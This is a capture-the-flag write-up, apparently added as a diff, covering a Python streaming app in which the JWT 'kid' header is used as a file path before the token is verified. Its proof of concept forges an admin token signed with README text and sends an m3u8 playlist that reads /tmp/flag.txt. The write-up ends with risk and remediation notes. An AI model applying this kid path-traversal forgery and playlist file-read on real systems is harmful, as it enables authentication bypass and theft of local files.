@@ -1,0 +1,87 @@
+---
+title: Dojo 52
+---
+
+### Description
+
+The application allows users to stream media using JSON payload input crafted by the user. However, part of the code is vulnerable. Namely the `verify_token()` and `load_key()` functions, which parses the `kid` parameter from the token before any token validation. This leads to path traversal to unauthorized files on the system. This results from improper path validation or sanitization of user-supplied token data, where the README.txt file's text content is then processed by JWT as a key to craft an admin token.
+
+### Exploitation
+
+We are presented an application that allow user to stream media using the json input. A through code analysis was performed during the initial reconnaissance phase which reveals the underlying tech-stack. The application uses python, streamlink, jinja2 templates and jwt library. Various utility function is implementating to parse the incoming tokens and manage application stream.
+
+### Code Analysis
+
+#### Setup method
+
+* creates `/tmp/keys` and saves `kid.txt` in there
+* creates `/tmp/flag.txt` and saves the flag in it
+* create `/tmp/README.txt` with some text
+* creates `/tmp/templates/index.html`
+
+#### Main code
+
+* load\_key() loads the key with kid from `/tmp/keys/kid.txt`
+* verify\_token()
+  * gets key from header (kid)
+  * decodes token
+  * **Uses the kid in load\_key() before doing any verification and/or sanitisation**
+* valid*filename() checks if has letters, digits and "*" or "-" characters
+* main()
+  * change directory to `/tmp` and loads `/templates/index.html`
+  * loads data\_json (my input) and extracts filename, content and token
+  * checks if token claims has "isadmin"
+  * opens `/tmp/filename.m3u8` and writes to content
+  * loads and streams file or throws error
+
+### PoC
+
+To generate the forged JWT token, the website https://jwt.io was used.\
+Header:
+
+```
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../README"
+}
+```
+
+Payload:
+
+```
+{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "isadmin": true,
+  "iat": 1516239022
+}
+```
+
+Secret: `streamcore is a new project developed to handle u3m8 files more easily.` (taken from README)
+
+The final payload:
+
+```
+{
+  "filename": "flag",
+  "content": "#EXTM3U\n#EXT-X-TARGETDURATION:1\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0,\nfile:///tmp/flag.txt\n#EXT-X-ENDLIST\n",
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL1JFQURNRSJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaXNhZG1pbiI6dHJ1ZSwiaWF0IjoxNTE2MjM5MDIyfQ.0FcpfbvX1ImaBYgO7JF4QQp_8-nnmSEAIMWIjRc2rsY"
+}
+```
+
+The flag is retrieved from the UI: `FLAG{R3ad1ng_F1l3s_As_A_S3rvic3!}`.
+
+### Risk
+
+The flaw allows unauthenticated remote actors to bypass logical authentication controls, perform privilege escalation to full Administrator, and read highly sensitive local files, leading to access unauthorized resources.
+
+### Remediation
+
+Use proper token validation before using token claims as dynamic values for paths and other inputs.
+
+#### Resources
+
+* https://fileinfo.com/extension/m3u8
+* https://iwanttools.com/tool/m3u-generator
+* https://www.jwt.io/
